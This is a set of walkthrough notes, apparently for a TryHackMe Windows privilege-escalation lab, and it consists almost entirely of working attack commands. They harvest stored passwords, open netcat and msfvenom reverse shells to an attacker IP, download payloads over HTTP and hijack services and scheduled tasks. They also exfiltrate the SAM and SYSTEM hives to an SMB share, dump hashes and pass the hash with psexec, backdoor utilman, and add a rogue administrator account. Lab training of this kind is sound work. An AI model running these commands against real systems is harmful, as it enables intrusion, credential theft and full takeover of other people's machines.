+++
title = "Windows Privilege Escalation"
+++

# https://tryhackme.com/room/windowsprivesc20

```bash
=================================
10.10.180.197 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.10.180.197' >> ~/.zshrc && source ~/.zshrc

xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:$TARGET /u:thm-unpriv /p:'Password321'

### FINDING PLAINTEXT PASSWORDS

$files = @(
    "C:\Unattend.xml",
    "C:\Windows\Panther\Unattend.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\system32\sysprep.inf",
    "C:\Windows\system32\sysprep\sysprep.xml"
)
foreach ($file in $files) {
    if (Test-Path $file) {
        Write-Host "--- Content of $file ---" -ForegroundColor Green
        Get-Content $file
        Write-Host "`n"
    } else {
        Write-Host "--- File not found: $file ---" -ForegroundColor Yellow
    }
}
// not found

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
// cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z

cmdkey /list
// Target: WindowsLive:target=virtualapp/didlogical
// Type: Generic
// User: 02facuvxpobdssom
// Local machine persistence
// 
// Target: Domain:interactive=WPRIVESC1\mike.katz
// Type: Domain Password
// User: WPRIVESC1\mike.katz
runas /savecred /user:WPRIVESC1\mike.katz cmd.exe

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
// <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
// ^^^ password

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021

### QUICK WINS

# Hijacking Vuln Task
schtasks /query /fo list /v /tn vulntask
icacls c:\tasks\schtask.bat
# on KALI:
# nc -vlnp 4444
echo c:\tools\nc64.exe -e cmd.exe 10.13.93.54 4444 > C:\tasks\schtask.bat
schtasks /run /tn vulntask

# MSI w/ admin privs
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

# Windows Scheduler
nc -nlnp 4445
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.93.54 LPORT=4445 -f exe-service -o rev-svc.exe

cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
wget http://10.13.93.54:8000/rev-svc.exe -O WService.exe
icacls WService.exe /grant Everyone:F
# in PowerShell sc = Set-Content so use "sc.exe"
sc.exe stop windowsscheduler
sc.exe start windowsscheduler

# Bad Quoting
sc.exe qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2

nc -nlnp 4446
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.93.54 LPORT=4446 -f exe-service -o Disk.exe

cd C:\MyPrograms
wget http://10.13.93.54:8000/Disk.exe -O Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
sc.exe stop "disk sorter enterprise"
sc.exe start "disk sorter enterprise"

# Insecure Service Perms
C:\tools\AccessChk\accesschk64.exe -qlc thmservice
...
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

nc -nlnp 4447
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.93.54 LPORT=4447 -f exe-service -o rev-svc3.exe

cd C:\Users\thm-unpriv\
wget http://10.13.93.54:8000/rev-svc3.exe -O rev-svc3.exe
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
sc.exe stop THMService
sc.exe start THMService

### Windows Privileges - SeBackupPrivilege

- https://github.com/gtworek/Priv2Admin
- https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants

# Target
whoami /priv
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive

# Kali
mkdir share
impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share

# Target
copy C:\Users\THMBackup\sam.hive \\10.13.93.54\public\
copy C:\Users\THMBackup\system.hive \\10.13.93.54\public\

# Kali
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
// Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
// Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
// DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
// WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
// THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
// THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::

impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@$TARGET
// nt authority\system

### Windows Privileges - SeTakeOwnership

whoami /priv
// SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled

takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
copy cmd.exe utilman.exe
// LOCK -> EASE OF ACCESS BUTTON -> SYSTEM CMD PROMPT

### Windows Privileges - SeImpersonate / SeAssignPrimaryToken

# Starting fake WinRM service for BITS to auth to
nc -lvp 4442
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.13.93.54 4442"

### VULN SOFTWARE

wmic product get name,version,vendor
// Name                                                            Vendor                                   Version
// AWS Tools for Windows                                           Amazon Web Services Developer Relations  3.15.1248
// VNC Server 6.8.0                                                RealVNC                                  6.8.0.45849
// Amazon SSM Agent                                                Amazon Web Services                      3.0.529.0
// Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.40.33816     Microsoft Corporation                    14.40.33816
// aws-cfn-bootstrap                                               Amazon Web Services                      2.0.5
// Druva inSync 6.6.3                                              Druva Technologies Pte. Ltd.             6.6.3.0
// Microsoft Visual C++ 2022 X64 Additional Runtime - 14.40.33816  Microsoft Corporation                    14.40.33816
// AWS PV Drivers                                                  Amazon Web Services                      8.3.4

# https://www.exploit-db.com/exploits/48505
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add

### WIN PRIVESC SCANNERS

# winPEAS
# https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS

wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O winpeas.exe
Invoke-WebRequest -Uri http://10.13.93.54/winpeas.exe -OutFile winpeas.exe
.\winpeas.exe > winpeas_output.txt
Get-Content winpeas_output.txt | Select-String -Pattern "GIVES YOU HIGHER PRIVS"

# PrivEsc Check
# https://github.com/itm4n/PrivescCheck/tree/master

wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
Invoke-WebRequest -Uri http://10.13.93.54/PrivescCheck.ps1 -OutFile PrivescCheck.ps1
Set-ExecutionPolicy Bypass -Scope Process -Force
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck | Tee-Object -FilePath privesc_output.txt
```